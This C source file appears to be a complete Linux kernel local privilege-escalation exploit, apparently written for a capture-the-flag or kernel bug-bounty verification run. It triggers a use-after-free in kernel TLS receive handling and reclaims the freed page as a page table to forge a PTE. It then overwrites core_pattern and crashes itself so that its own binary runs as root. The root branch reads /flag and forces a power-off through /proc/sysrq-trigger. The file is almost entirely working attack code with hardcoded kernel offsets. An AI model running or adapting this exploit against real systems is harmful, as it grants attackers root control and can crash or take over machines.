#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>

#define PAUSE           \
	{                   \
		int x;          \
		printf(":");    \
		read(0, &x, 1); \
	}

#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})

#define PAUSE           \
	{                   \
		int x;          \
		printf(":");    \
		read(0, &x, 1); \
	}
#define EXPLOIT_PORT 4444

void setup_cpu_affinity(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock)
{
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	SYSCHK(setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
	SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

void vuln_trigger_core_pattern(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

int main(int argc, char **argv)
{
	int listener, conn, client;
	static char buf[0x100000];
	static char *addrs[0x100];

	if (argc > 1)
	{

		// This section of code will be execute by root!
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;sleep 1;echo o>/proc/sysrq-trigger");
		exit(0);
	}

	int sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	char *maddr = (void *)0x200000;
	// Loop mapped buffers with a 0x200000 (2MB PMD) stride instead of PAGE_SIZE.
	// This forces the kernel to allocate entirely new PTE page tables rather than
	// reusing existing ones, guaranteeing our spray hits fresh PTE pagetable objects.
	for (int i = 0; i < 0x100; i++)
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

	printf("bind %d\n", bind(sock, (struct sockaddr *)&sa, sizeof(sa)));
	struct sockaddr_in addr = {0};
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setup_cpu_affinity(0);

	// === Setup listener ===
	listener = socket(AF_INET, SOCK_STREAM, 0);
	if (listener < 0)
	{
		perror("socket listener");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(EXPLOIT_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("bind");
		exit(1);
	}
	if (listen(listener, 1) < 0)
	{
		perror("listen");
		exit(1);
	}

	// === Setup client and connect immediately ===
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0)
	{
		perror("socket client");
		exit(1);
	}

	if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("connect");
		exit(1);
	}

	printf("[*] Client connected to server\n");
	// === Accept on server side (non-blocking because client already connected) ===
	conn = accept(listener, NULL, 0);
	if (conn < 0)
	{
		perror("accept");
		exit(1);
	}

	printf("[*] Server accepted connection\n");
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	// These dummy sockets are used to allocate and free an interleaving skb (B) during the UAF.
	// This prevents the slab allocator's fast-path double-free detection from noticing that
	// victim skb (A) was freed twice sequentially, creating an A -> B -> A free pattern.
	int dummy_cli = accept(listener, 0, 0);

	setup_tls(client); // client end

	unsigned char tls_record[] = {
		// --- TLS RECORD HEADER (5 Bytes) ---
		0x17, // Content Type: Application Data (23)
		0x03, // Protocol Version Major: 3
		0x03, // Protocol Version Minor: 3 (3.3 = TLS 1.2)
		0x00, // Payload Length (High Byte): 0
		0x23, // Payload Length (Low Byte): 35 (0x23 = 35 bytes of data follow)

		// --- TLS PAYLOAD (35 Bytes Total) ---

		// Initialization Vector (8 Bytes)
		// Used in TLS 1.2 AEAD ciphers like AES-GCM.
		// It prevents replay attacks and ensures encryption uniqueness.
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,

		// Encrypted Ciphertext + Authentication Tag (27 Bytes)
		// The actual application data (encrypted) followed by the MAC/Auth Tag
		// (typically 16 bytes for GCM) to verify data integrity.
		0x6e, 0xc7, 0x5f, 0xb2,
		0xe2, 0xb4, 0x87, 0x46,
		0x1e, 0xdd, 0xcb, 0xc6,
		0x92, 0xb4, 0x54, 0x7a,
		0xae, 0xa5, 0x16, 0xe7,
		0x7a, 0x2e, 0x5c, 0xd9,
		0xac, 0x9a, 0x46};

	int pfd[2];
	pipe(pfd);

	write(pfd[1], tls_record, sizeof(tls_record));
	write(pfd[1], buf, 0x800 - sizeof(tls_record));

	int n = splice(pfd[0], 0, conn, 0, 0x300, 0);
	write(dummy_cli, buf, 1);

	char *ro = SYSCHK(mmap(NULL, 0x100000, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0));

	n = recv(client, ro, 0x100000, 0); // fill rxm->full_len by early return

	addr.sin_family = AF_UNSPEC;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = 0;
	connect(client, &addr, sizeof(addr));

	read(dummy_serv, buf, 1); // prevent double free crash

	read(pfd[0], buf, 0x800 - sizeof(tls_record)); // free page to pipe->tmp_page

	n = recv(client, buf, 0x100000, 0); // trigger page put

	write(pfd[1], buf, 0x600); // get page from pipe->tmp_page

	// touch addrs to allocate page tables
	int sum = 0;
	for (int i = 0; i < 0x100; i++)
		sum += addrs[i][0];
	(void)sum;

	read(pfd[0], buf, 0x600); // read page, it should be pagetable and free to pipe->tmp_page

	printf("pte? %zx\n", *(size_t *)buf);

#define ZERO_OFFSET 0x3696000
#define CORE_PATTERN 0x2bbace0

	size_t pa = *(size_t *)&buf[0];
	pa &= 0xfffffffff000;
	pa += 0x867;
	pa -= ZERO_OFFSET;
	pa += (CORE_PATTERN & (~0xfff));
	int offset = CORE_PATTERN & (0xfff);

	// By writing to the pipe, the payload writes directly into the reclaimed kernel page (pagetable)
	// effectively injecting a fake PTE pointing to `core_pattern`.
	write(pfd[1], &pa, 8);
	for (int i = 0; i < 0x100; i++)
		strcpy(&addrs[i][offset], "|/proc/%P/fd/666 %P");

	if (fork() == 0)
	{
		setsid();
		vuln_trigger_core_pattern("");
	}

	PAUSE;
	return 0;
}
